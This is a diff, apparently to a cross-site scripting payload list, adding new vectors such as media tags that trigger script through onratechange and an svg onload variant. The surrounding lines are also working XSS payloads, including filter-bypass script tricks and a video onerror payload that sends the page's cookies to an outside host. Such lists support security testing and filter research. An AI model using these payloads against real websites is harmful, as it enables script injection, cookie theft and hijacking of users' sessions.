@@ -913,6 +913,8 @@ code
 <audio autoplay onplay=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>
 <video autoplay onplaying=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>
 <audio autoplay onplaying=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>
+<video controls autoplay onratechange=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>
+<audio controls autoplay onratechange=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>
 <* onpointerover=alert(1) style=display:block>XSS</*>
 <* onpointerdown=alert(1) style=display:block>XSS</*>
 <* onpointerenter=alert(1) style=display:block>XSS</*>
@@ -1006,6 +1008,7 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <script>Function`X${document.location.hash.substr`1`}```<\/script>
 <video><source onerror=location=/\\02.rs/+document.cookie>
 <svg onload=alert(1) 
+<svg onload=alert(1)<!--
 <script>throw[onerror]=[alert],1<\/script>
 <script>var{a:onerror}={a:alert};throw 1<\/script>
 <script>var{haha:onerror=alert}=0;throw 1<\/script>
